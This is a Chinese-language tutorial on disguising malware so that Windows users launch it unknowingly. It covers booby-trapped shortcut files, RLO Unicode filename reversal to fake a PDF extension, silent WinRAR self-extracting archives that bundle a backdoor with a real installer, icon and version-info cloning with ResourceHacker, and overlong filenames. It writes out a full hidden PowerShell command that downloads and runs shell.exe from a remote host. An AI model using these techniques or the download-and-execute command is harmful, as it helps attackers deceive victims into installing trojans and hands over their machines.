  

## ****快捷方式****

修改快捷方式中的目标栏内容执行powershell命令下载木马  
将以下内容写入目标栏中

C:\Windows\System32\cmd.exe /c powershell.exe -nop -w hidden -command IEX
(new-object
net.webclient).DownloadFile('http://ip/shell.exe','C:\Windows\Temp\shell.exe');&cmd
/c "C:\Windows\Temp\shell.exe"

调用powershell，隐藏窗口执行下载网站的EXE恶意文件，存储到某一文件夹下，命令行运行EXE恶意文件  
隐藏恶意文件，利用命名及图标伪装的快捷方式诱导点击  
将真实要执行的恶意文件进行隐藏（此步骤可选）

创建快捷方式指向该文件，修改目标内容为explorer.exe .\evil.exe 将起始位置内容删除

![1658461616_62da1db0992939f8e0fd8.png!small?1658461617315](https://image.3001.net/images/20220722/1658461616_62da1db0992939f8e0fd8.png!small?1658461617315)

  
修改后缀为txt，并修改图标  
![1658461624_62da1db8dd024518d95aa.png!small?1658461626141](https://image.3001.net/images/20220722/1658461624_62da1db8dd024518d95aa.png!small?1658461626141)  
最终效果如下，双击启动计算器。

![1658461631_62da1dbf0a5ba0a52f21a.png!small?1658461631651](https://image.3001.net/images/20220722/1658461631_62da1dbf0a5ba0a52f21a.png!small?1658461631651)

##  ** **RLO编码文件名欺骗****

在windows下，如果字符串中存在Unicode字符RLO，则该字符右边的字符串会逆序显示，将后缀进行颠倒，实现文件名欺骗，不更改文件原本类型。  
 ** **实现过程****  
F2进行重命名后在.exe前右键选择“插入Unicode控制字符（I）”点击“RLO”，输入fdp回车（该编码会导致输入显示逆序）即变成了pdf格式文件（注：不用加"."）。

![1658461638_62da1dc67b2a2396cd81d.png!small?1658461639178](https://image.3001.net/images/20220722/1658461638_62da1dc67b2a2396cd81d.png!small?1658461639178)

最终效果

![1658461646_62da1dce1e6dc0a42a334.png!small?1658461647155](https://image.3001.net/images/20220722/1658461646_62da1dce1e6dc0a42a334.png!small?1658461647155)

 ** **自解压****

利用winrar压缩工具自带的自解压功能实现全程无感知上线

利用工具的下载链接：

Winrar下载链接：  
https://www.win-rar.com/download.html?&L=0

ResourceHacker：  
<http://www.angusj.com/resourcehacker/>

  

##  ** **实现过程****

  
准备好正常的软件和后门软件  
![1658461682_62da1df213254e613f78d.png!small?1658461683257](https://image.3001.net/images/20220722/1658461682_62da1df213254e613f78d.png!small?1658461683257)  
创建自解压文件,以真实安装包名字命名  
![1658461686_62da1df65c3b31cf75b39.png!small?1658461687018](https://image.3001.net/images/20220722/1658461686_62da1df65c3b31cf75b39.png!small?1658461687018)  
设置自解压选项

![1658461691_62da1dfb2fb60c414c31f.png!small?1658461692480](https://image.3001.net/images/20220722/1658461691_62da1dfb2fb60c414c31f.png!small?1658461692480)

![1658461697_62da1e01addfb8a5aaa09.png!small?1658461698615](https://image.3001.net/images/20220722/1658461697_62da1e01addfb8a5aaa09.png!small?1658461698615)

解压后运行自解压文件中真实的安装包和恶意文件，使用静默模式，以达成无感知效果

![1658461702_62da1e0657dce27541669.png!small?1658461703084](https://image.3001.net/images/20220722/1658461702_62da1e0657dce27541669.png!small?1658461703084)

![1658461708_62da1e0ce70283152a0a8.png!small?1658461710063](https://image.3001.net/images/20220722/1658461708_62da1e0ce70283152a0a8.png!small?1658461710063)

修改自解压文件的资源文件

利用ResourceHacker工具（该工具可查看，修改，添加，删除和重命名，提取Windows可执行文件和资源文件的资源替换工具）修改自解压文件资源，更逼真

先提取正常软件的图标

![1658461717_62da1e1567b9d7eab5ea2.png!small?1658461718982](https://image.3001.net/images/20220722/1658461717_62da1e1567b9d7eab5ea2.png!small?1658461718982)

打开刚才创建的自解压文件，替换图标

![1658461722_62da1e1a18664c32ab292.png!small?1658461723284](https://image.3001.net/images/20220722/1658461722_62da1e1a18664c32ab292.png!small?1658461723284)

保存后打开源正常文件，查看正常软件的version信息，并复制下来，后面自解压软件替换信息用。

![1658461728_62da1e200ec57b9fd2017.png!small?1658461728907](https://image.3001.net/images/20220722/1658461728_62da1e200ec57b9fd2017.png!small?1658461728907)

添加自解压软件的version信息

![1658461737_62da1e297742ce345195f.png!small?1658461738449](https://image.3001.net/images/20220722/1658461737_62da1e297742ce345195f.png!small?1658461738449)

![1658461748_62da1e34131aa259245f0.png!small?1658461749653](https://image.3001.net/images/20220722/1658461748_62da1e34131aa259245f0.png!small?1658461749653)

点绿色箭头进行保存

![1658461753_62da1e39dff15002181fc.png!small?1658461754781](https://image.3001.net/images/20220722/1658461753_62da1e39dff15002181fc.png!small?1658461754781)

查看信息可见一样

![1658461760_62da1e4034c9bfeaeb3a5.png!small?1658461761099](https://image.3001.net/images/20220722/1658461760_62da1e4034c9bfeaeb3a5.png!small?1658461761099)

 ** **超长文件名隐藏****

利用windows目录默认显示文件名长度特性，进行修改将文件名加长隐藏后缀名。

![1658461764_62da1e44ee11e36a0a697.png!small?1658461766227](https://image.3001.net/images/20220722/1658461764_62da1e44ee11e36a0a697.png!small?1658461766227)

